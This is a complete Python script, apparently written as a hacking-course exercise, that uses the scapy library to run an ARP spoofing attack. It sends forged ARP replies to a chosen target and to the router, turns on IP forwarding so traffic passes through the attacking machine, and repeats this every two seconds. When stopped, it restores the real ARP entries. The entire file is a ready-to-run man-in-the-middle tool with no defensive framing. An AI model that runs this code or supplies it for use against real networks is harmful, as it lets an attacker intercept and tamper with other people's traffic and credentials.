#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse
import os

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

def get_mac(ip):
  arp_request = scapy.ARP(pdst=ip)
  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  arp_request_broadcast = broadcast/arp_request
  answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

  return answered_list[0][1].hwsrc

def get_ip():
  parser = optparse.OptionParser()

  parser.add_option("-t", "--target", dest="target", help="Target IP")
  parser.add_option("-r", "--router", dest="router", help="Router IP")
  (options, arguments) = parser.parse_args()

  if not options.target:
    parser.error(" [-] Please specify an ip, use --help for more info.")
  if not options.router:
        parser.error(" [-] Please specify the router ip, use --help for more info.")
  return options




options = get_ip()
sent_packets_count = 0
os.popen('echo 1 > /proc/sys/net/ipv4/ip_forward')
try:
    while True:
        spoof(options.target,options.router)
        spoof(options.router,options.target)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent : " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C .......  mothafacka :D")
    restore(options.target,options.router)
    restore(options.router,options.target)
